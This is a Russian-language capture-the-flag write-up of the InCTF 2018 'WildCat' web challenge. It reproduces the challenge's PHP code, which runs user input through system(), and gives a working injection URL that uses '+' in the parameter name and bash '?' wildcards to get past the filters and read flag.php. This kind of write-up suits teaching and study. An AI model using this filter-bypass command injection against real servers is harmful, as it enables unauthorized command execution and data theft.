---
title: Neo's Fun - Write Up InCTF2018 WildCat
---

# Writeup WildCat (InCTF 2018)


## Первый раз

Код страницы с http://18.191.205.153/

```
<img src='cat.jpg' height=400><!-- is_debug -->
```
Ничего особенного кроме "is_debug" - спасибо `Daniil159x`

## Собираем информацию о сервере

Смотрим заголовки ответа от сервера

1. Делаем кривой запрос через nc

```
$ nc 18.191.205.153 80
```
Тут вводим следующее
```
GET / HTTP/1.1
```
И жмем enter
```
HTTP/1.1 400 Bad Request
Date: Sun, 07 Oct 2018 12:46:21 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 302
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 172.17.0.2 Port 80</address>
</body></html>
```
В заголовках ответа видим `Apache/2.4.25 (Debian)` - то есть запущено под Apache на Debian


## По методу от Daniil159x

http://18.191.205.153/?is_debug

Видимо

```
<?php
error_reporting(0);
include('flag.php');
$message = "<img src='cat.jpg' height=400><!-- is_debug -->";

if (isset($_GET['is_debug']))
    {
    highlight_file(__FILE__) and die();
    }
  else
    {
    $qs = $_SERVER['QUERY_STRING'];
    if(!(substr_count($qs, '_') > 0) && !(substr_count($qs, '%')> 1))
        {
            $cmd = $_GET['c_m_d'];
            if(!preg_match('/[a-z0-9]/is', $cmd)){
                system("/sandboxed_bin/".$cmd);
            }else{
                echo $message;
                die();
            }
        }
    echo $message;
        die();
    }
?>

```

## После долго изучения

Понимаем что нужно каким то образом прописать параметр странице /?c_m_d=bash_command
1. QUERY_STRING не должна содержать символ '_' и более одного '%'
2. bash_command не должна содержани ни a-z ни 0-9 (проверяется на preg_match)
Если пройти эти условия то bash_command будет выполнена


## Обходим 1-ую проблему

Знание: Пробел " " можно заменить на "+" или на "%20" (что делает обычно браузер)

Где то в пхп есть обработчик (конвертор) имен параметров get (наш `c_m_d`), который не любит пробелы в именах параметров и меняет их на "_". То есть если мы напишем `/?c+m+d=` то мы пройдем первое условие а парсер GET параметров переведет его из `c+m+d` вначале в `c m d` а потом в `c_m_d` и к моменту выполнения кода на этой строке: `$cmd = $_GET['c_m_d'];` все будет ок.

## Обходим 2-ую проблему

### Время справки
WildCat как оказалось отсылка к WildCards (Почитать можно если в поисковой системе набрать `bash wildcards`)

Смысл очень простой:

* `*` - символ означающий любое количество любых символов
* `?` - один любой сивол

Если попробовать выполнить в вашей домашней директории команду 

```
$ .*
bash: .: ..: это каталог
```
*Ха-ха... баш нашел '..' и сказал что нельзя выполнить это так как это каталог*

### Вернемся к заданию

В общем нам нельзя передавать в `c_m_d` ничего вразумительного...
нас останавливает вот эта вот строка `if(!preg_match('/[a-z0-9]/is', $cmd)){`

И еще выполняется будет программа которая которая лежит в каталоге "/sandboxed_bin/" (См  *system("/sandboxed_bin/".$cmd);*)

Предположим что там есть `cat` а вывести мы хотим `flag.php` и желательно куда нить в файл `> .$` где `.$` имя файла

Тогда это будет так: 
`/sandboxed_bin/cat flag.php > .$`

То есть GET-запрос передать нужно так:

`/?c+m+d=cat+flag.php+>+.$`

Но символы использовать нельзя поэтому меняем все символы на знак `?` (см wildcards):

`/?c+m+d=???+????.???+>+.$`

Выполняем:

`http://18.191.205.153/?c+m+d=???+????.???+%3E+.$`

И запрашиваем файл:

`http://18.191.205.153/.$`

Нам вернется содержимое файла `flag.php` записанный в `.$`.
Так как `.$` без расширения `.php` он сервером интерпретироваться не будет и вернятся как есть:

```
<?php
$flag = "inctf{PhP_TriCk_wIth_wiLdC@rd_byPa$$}";
?>
```

## Флаг сдан

Спасибо.






